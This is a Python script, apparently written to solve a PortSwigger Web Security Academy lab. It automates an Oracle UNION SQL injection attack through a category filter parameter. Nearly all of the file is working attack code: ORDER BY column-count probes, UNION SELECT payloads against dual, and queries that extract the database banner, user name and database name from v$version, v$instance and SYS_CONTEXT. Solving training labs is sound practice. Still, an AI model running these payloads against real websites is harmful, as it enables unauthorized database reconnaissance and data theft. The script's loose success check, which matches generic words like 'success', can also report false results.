#!/usr/bin/env python3
"""
PortSwigger Lab Solver - SQL Injection UNION Attack on Oracle
Elite-grade automated exploitation framework
Author: Shadow Senior
Target: SQL injection attack, querying the database type and version on Oracle
"""

import requests
import sys
import argparse
import time
import re
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from colorama import init, Fore, Back, Style
from rich.console import Console
from rich.panel import Panel
from rich.progress import track
from rich import print as rprint

# Initialize colorama and rich
init(autoreset=True)
console = Console()

class PortSwiggerOracleUnionSolver:
    def __init__(self, lab_url):
        """Initialize the lab solver with target URL"""
        self.lab_url = lab_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.solved = False
        self.columns_count = 0
        self.filter_endpoint = None
    
    def print_banner(self):
        """Print elite hacker-style banner"""
        banner = """
    ╔══════════════════════════════════════════════════════════════╗
    ║                  🔥 PORTSWIGGER LAB SOLVER 🔥                ║
    ║                    Elite Exploitation Framework              ║
    ║                                                              ║
    ║    Target: Oracle Database UNION SQL Injection              ║
    ║    Objective: Extract database version information          ║
    ║    Status: INITIALIZING ORACLE EXPLOITATION...              ║
    ╚══════════════════════════════════════════════════════════════╝
        """
        console.print(Panel(banner, style="bold red"))
    
    def log_info(self, message):
        """Log info message with style"""
        rprint(f"[bold blue][+][/bold blue] {message}")
    
    def log_success(self, message):
        """Log success message with style"""
        rprint(f"[bold green][✓][/bold green] {message}")
    
    def log_warning(self, message):
        """Log warning message with style"""
        rprint(f"[bold yellow][!][/bold yellow] {message}")
    
    def log_error(self, message):
        """Log error message with style"""
        rprint(f"[bold red][×][/bold red] {message}")
    
    def log_attack(self, message):
        """Log attack message with style"""
        rprint(f"[bold magenta][🎯][/bold magenta] {message}")

    def check_lab_accessibility(self):
        """Verify that the lab is accessible"""
        try:
            self.log_info("Checking lab accessibility...")
            response = self.session.get(self.lab_url, timeout=10)
            
            if response.status_code == 200:
                self.log_success(f"Lab accessible at {self.lab_url}")
                return True
            else:
                self.log_error(f"Lab returned status code: {response.status_code}")
                return False
                
        except requests.exceptions.RequestException as e:
            self.log_error(f"Failed to access lab: {str(e)}")
            return False
    
    def is_lab_solved(self, response_text):
        """Check if lab is solved by looking for success indicators"""
        success_indicators = [
            "congratulations, you solved the lab!",
            "lab solved",
            "well done!",
            "success",
            "solved"
        ]
        
        soup = BeautifulSoup(response_text, 'html.parser')
        
        # Check for success message in text content
        page_text = soup.get_text().lower()
        for indicator in success_indicators:
            if indicator in page_text:
                return True
        
        # Check for specific success elements
        success_elements = soup.find_all(['div', 'span', 'p'], 
                                       class_=re.compile(r'(success|solved|congratulation)', re.I))
        if success_elements:
            return True
        
        # Check for solved lab banner/header
        headers = soup.find_all(['h1', 'h2', 'h3'])
        for header in headers:
            if any(indicator in header.get_text().lower() for indicator in success_indicators):
                return True
        
        return False
    
    def has_oracle_version_info(self, response_text):
        """Check if response contains Oracle database version information"""
        oracle_indicators = [
            "oracle",
            "database",
            "version",
            "banner",
            "release",
            "enterprise edition",
            "personal edition",
            "express edition"
        ]
        
        soup = BeautifulSoup(response_text, 'html.parser')
        page_text = soup.get_text().lower()
        
        oracle_count = 0
        for indicator in oracle_indicators:
            if indicator in page_text:
                oracle_count += 1
        
        # If we have multiple Oracle-related terms, likely we got version info
        if oracle_count >= 2:
            self.log_success(f"Oracle version information detected! ({oracle_count} indicators)")
            return True
        
        # Look for specific version patterns
        version_patterns = [
            r'oracle.*\d+',
            r'database.*\d+',
            r'release.*\d+',
            r'version.*\d+'
        ]
        
        for pattern in version_patterns:
            if re.search(pattern, page_text, re.IGNORECASE):
                self.log_success(f"Version pattern detected: {pattern}")
                return True
        
        return False
    
    def extract_category_filter_endpoint(self, response):
        """Extract the category filter endpoint from the page"""
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Look for category filter links or forms
        category_links = soup.find_all('a', href=re.compile(r'category='))
        
        if category_links:
            # Extract the base filter URL
            first_link = category_links[0]['href']
            # Parse to get the base endpoint
            if '?' in first_link:
                base_url = first_link.split('?')[0]
            else:
                base_url = first_link
            
            return urljoin(self.lab_url, base_url)
        
        # Default fallback - common PortSwigger lab structure
        return urljoin(self.lab_url, "/filter")
    
    def determine_column_count(self):
        """Determine the number of columns using ORDER BY technique"""
        self.log_attack("Determining number of columns in the query...")
        
        # Get the main page first
        main_response = self.session.get(self.lab_url)
        if main_response.status_code != 200:
            return False
        
        # Extract filter endpoint
        self.filter_endpoint = self.extract_category_filter_endpoint(main_response)
        self.log_info(f"Target endpoint: {self.filter_endpoint}")
        
        # Test column counts from 1 to 10
        for columns in range(1, 11):
            self.log_attack(f"Testing {columns} columns...")
            
            # Oracle-specific ORDER BY payload
            payload = f"' ORDER BY {columns}--"
            params = {'category': payload}
            
            try:
                response = self.session.get(self.filter_endpoint, params=params, timeout=10)
                
                if response.status_code == 200:
                    # Check if we get an error (usually means too many columns)
                    if "error" not in response.text.lower() and "exception" not in response.text.lower():
                        self.log_success(f"✓ {columns} columns - No error detected")
                        self.columns_count = columns
                    else:
                        self.log_warning(f"✗ {columns} columns - Error detected")
                        if self.columns_count > 0:
                            break
                else:
                    self.log_warning(f"✗ {columns} columns - HTTP error: {response.status_code}")
                    if self.columns_count > 0:
                        break
                        
            except requests.exceptions.RequestException as e:
                self.log_error(f"Error testing {columns} columns: {str(e)}")
                continue
        
        if self.columns_count > 0:
            self.log_success(f"🎯 Determined column count: {self.columns_count}")
            return True
        else:
            self.log_error("Could not determine column count")
            return False
    
    def test_union_compatibility(self):
        """Test UNION SELECT compatibility and find text columns"""
        self.log_attack("Testing UNION SELECT compatibility...")
        
        # Build UNION SELECT payload with text values
        if self.columns_count == 1:
            union_payload = "'+UNION+SELECT+'test'+FROM+dual--"
        elif self.columns_count == 2:
            union_payload = "'+UNION+SELECT+'test','test2'+FROM+dual--"
        elif self.columns_count == 3:
            union_payload = "'+UNION+SELECT+'test','test2','test3'+FROM+dual--"
        else:
            # Build payload for more columns
            test_values = ",".join([f"'test{i}'" for i in range(1, self.columns_count + 1)])
            union_payload = f"'+UNION+SELECT+{test_values}+FROM+dual--"
        
        self.log_attack(f"Testing UNION payload: {union_payload}")
        
        params = {'category': union_payload}
        
        try:
            response = self.session.get(self.filter_endpoint, params=params, timeout=10)
            
            if response.status_code == 200:
                # Check if our test values appear in the response
                if "test" in response.text.lower():
                    self.log_success("🎯 UNION SELECT is working! Test values detected in response")
                    return True
                else:
                    self.log_warning("UNION SELECT executed but test values not visible")
                    return True  # Still might work for version extraction
            else:
                self.log_error(f"UNION test failed with status: {response.status_code}")
                return False
                
        except requests.exceptions.RequestException as e:
            self.log_error(f"Error testing UNION: {str(e)}")
            return False
    
    def extract_oracle_version(self):
        """Extract Oracle database version using UNION attack"""
        self.log_attack("Extracting Oracle database version...")
        
        # Oracle version extraction payloads
        version_payloads = []
        
        # Build payloads based on column count
        if self.columns_count == 1:
            version_payloads = [
                "'+UNION+SELECT+BANNER+FROM+v$version--",
                "'+UNION+SELECT+version+FROM+v$instance--",
                "'+UNION+SELECT+PRODUCT+FROM+PRODUCT_COMPONENT_VERSION--",
            ]
        elif self.columns_count == 2:
            version_payloads = [
                "'+UNION+SELECT+BANNER,+NULL+FROM+v$version--",
                "'+UNION+SELECT+BANNER,'null'+FROM+v$version--",
                "'+UNION+SELECT+version,+NULL+FROM+v$instance--",
                "'+UNION+SELECT+PRODUCT,+VERSION+FROM+PRODUCT_COMPONENT_VERSION--",
            ]
        else:
            # For 3+ columns, use NULL padding
            null_padding = ",".join(["NULL"] * (self.columns_count - 1))
            version_payloads = [
                f"'+UNION+SELECT+BANNER,+{null_padding}+FROM+v$version--",
                f"'+UNION+SELECT+version,+{null_padding}+FROM+v$instance--",
            ]
            
            # Also try with PRODUCT and VERSION for 2-column scenarios
            if self.columns_count >= 2:
                null_padding_2 = ",".join(["NULL"] * (self.columns_count - 2))
                version_payloads.append(f"'+UNION+SELECT+PRODUCT,+VERSION,+{null_padding_2}+FROM+PRODUCT_COMPONENT_VERSION--")
        
        for i, payload in enumerate(version_payloads, 1):
            self.log_attack(f"Testing version payload {i}/{len(version_payloads)}: {payload}")
            
            params = {'category': payload}
            
            try:
                response = self.session.get(self.filter_endpoint, params=params, timeout=10)
                
                if response.status_code == 200:
                    self.log_success(f"Payload executed successfully (Status: {response.status_code})")
                    
                    # Check if we got Oracle version information
                    if self.has_oracle_version_info(response.text):
                        self.log_success("🎉 Oracle version information extracted!")
                        
                        # Check if lab is solved
                        if self.is_lab_solved(response.text):
                            self.log_success("🏆 LAB SOLVED! Congratulations message detected!")
                            self.solved = True
                            return True
                        else:
                            # Check main page for lab completion
                            main_check = self.session.get(self.lab_url)
                            if self.is_lab_solved(main_check.text):
                                self.log_success("🏆 LAB SOLVED! Success detected on main page!")
                                self.solved = True
                                return True
                    
                    # Even if version info isn't clearly visible, check for lab completion
                    time.sleep(1)
                    verification_response = self.session.get(self.lab_url)
                    if self.is_lab_solved(verification_response.text):
                        self.log_success("🏆 LAB SOLVED! Success confirmed!")
                        self.solved = True
                        return True
                else:
                    self.log_warning(f"Version payload failed with status: {response.status_code}")
                    
            except requests.exceptions.RequestException as e:
                self.log_error(f"Error executing version payload: {str(e)}")
                continue
        
        # Try alternative approaches if standard payloads didn't work
        return self.try_alternative_oracle_techniques()
    
    def try_alternative_oracle_techniques(self):
        """Try alternative Oracle version extraction techniques"""
        self.log_attack("Attempting alternative Oracle extraction techniques...")
        
        alternative_payloads = []
        
        # Build alternative payloads
        if self.columns_count == 1:
            alternative_payloads = [
                "'+UNION+SELECT+(SELECT+BANNER+FROM+v$version+WHERE+ROWNUM=1)+FROM+dual--",
                "'+UNION+SELECT+USER+FROM+dual--",
                "'+UNION+SELECT+SYS_CONTEXT('USERENV','DB_NAME')+FROM+dual--",
            ]
        elif self.columns_count == 2:
            alternative_payloads = [
                "'+UNION+SELECT+(SELECT+BANNER+FROM+v$version+WHERE+ROWNUM=1),+NULL+FROM+dual--",
                "'+UNION+SELECT+USER,+NULL+FROM+dual--",
                "'+UNION+SELECT+SYS_CONTEXT('USERENV','DB_NAME'),+NULL+FROM+dual--",
                "'+UNION+SELECT+'Oracle'||+' '||+(SELECT+BANNER+FROM+v$version+WHERE+ROWNUM=1),+NULL+FROM+dual--",
            ]
        else:
            null_padding = ",".join(["NULL"] * (self.columns_count - 1))
            alternative_payloads = [
                f"'+UNION+SELECT+(SELECT+BANNER+FROM+v$version+WHERE+ROWNUM=1),+{null_padding}+FROM+dual--",
                f"'+UNION+SELECT+USER,+{null_padding}+FROM+dual--",
            ]
        
        for i, payload in enumerate(alternative_payloads, 1):
            self.log_attack(f"Testing alternative payload {i}/{len(alternative_payloads)}: {payload}")
            
            params = {'category': payload}
            
            try:
                response = self.session.get(self.filter_endpoint, params=params, timeout=10)
                
                if response.status_code == 200:
                    # Check for any Oracle-related content
                    if any(keyword in response.text.lower() for keyword in ['oracle', 'database', 'version']):
                        self.log_success("🎉 Oracle information detected with alternative technique!")
                        
                        # Verify lab completion
                        time.sleep(1)
                        verification_response = self.session.get(self.lab_url)
                        if self.is_lab_solved(verification_response.text):
                            self.log_success("🏆 LAB SOLVED! Alternative technique successful!")
                            self.solved = True
                            return True
                            
            except requests.exceptions.RequestException as e:
                self.log_error(f"Error with alternative payload: {str(e)}")
                continue
        
        return False
    
    def perform_oracle_union_attack(self):
        """Execute the complete Oracle UNION SQL injection attack"""
        self.log_attack("Initiating Oracle UNION SQL injection attack...")
        
        # Step 1: Determine column count
        if not self.determine_column_count():
            self.log_error("Failed to determine column count")
            return False
        
        # Step 2: Test UNION compatibility
        if not self.test_union_compatibility():
            self.log_error("UNION SELECT is not compatible")
            return False
        
        # Step 3: Extract Oracle version
        if self.extract_oracle_version():
            return True
        
        return False
    
    def run(self):
        """Main execution method"""
        self.print_banner()
        
        # Check lab accessibility
        if not self.check_lab_accessibility():
            self.log_error("Cannot proceed - lab is not accessible")
            return False
        
        # Perform the Oracle UNION attack
        if self.perform_oracle_union_attack():
            console.print(Panel(
                "🎯 [bold green]MISSION ACCOMPLISHED![/bold green] 🎯\n"
                "Oracle UNION SQL injection executed successfully!\n"
                "Database version: [bold green]EXTRACTED[/bold green]\n"
                "Lab status: [bold green]SOLVED[/bold green]",
                style="bold green",
                title="🏆 ORACLE PWNED 🏆"
            ))
            return True
        else:
            console.print(Panel(
                "❌ [bold red]MISSION FAILED[/bold red] ❌\n"
                "Oracle version extraction was not successful\n"
                "Database version: [bold red]NOT EXTRACTED[/bold red]\n"
                "Lab status: [bold red]UNSOLVED[/bold red]",
                style="bold red",
                title="💀 ORACLE FORTRESS HOLDS 💀"
            ))
            return False

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="PortSwigger Lab Solver - Oracle UNION SQL Injection",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 oracle_union_solver.py https://0a9f00dd04c2cee81970ce600d700014.web-security-academy.net
  python3 oracle_union_solver.py -u https://your-lab-url.web-security-academy.net
        """
    )
    
    parser.add_argument(
        'url', 
        nargs='?',
        help='Lab URL (can also use -u/--url flag)'
    )
    
    parser.add_argument(
        '-u', '--url',
        dest='url_flag',
        help='Lab URL'
    )
    
    args = parser.parse_args()
    
    # Get URL from either positional argument or flag
    lab_url = args.url or args.url_flag
    
    if not lab_url:
        console.print("[bold red]Error:[/bold red] Please provide a lab URL")
        console.print("Usage: python3 oracle_union_solver.py <LAB_URL>")
        console.print("   or: python3 oracle_union_solver.py -u <LAB_URL>")
        sys.exit(1)
    
    # Validate URL format
    parsed = urlparse(lab_url)
    if not parsed.scheme or not parsed.netloc:
        console.print("[bold red]Error:[/bold red] Invalid URL format")
        console.print("URL should be like: https://abc123.web-security-academy.net")
        sys.exit(1)
    
    try:
        # Initialize and run the solver
        solver = PortSwiggerOracleUnionSolver(lab_url)
        success = solver.run()
        
        # Exit with appropriate code
        sys.exit(0 if success else 1)
        
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Attack interrupted by user[/bold yellow]")
        sys.exit(1)
    except Exception as e:
        console.print(f"[bold red]Fatal error:[/bold red] {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()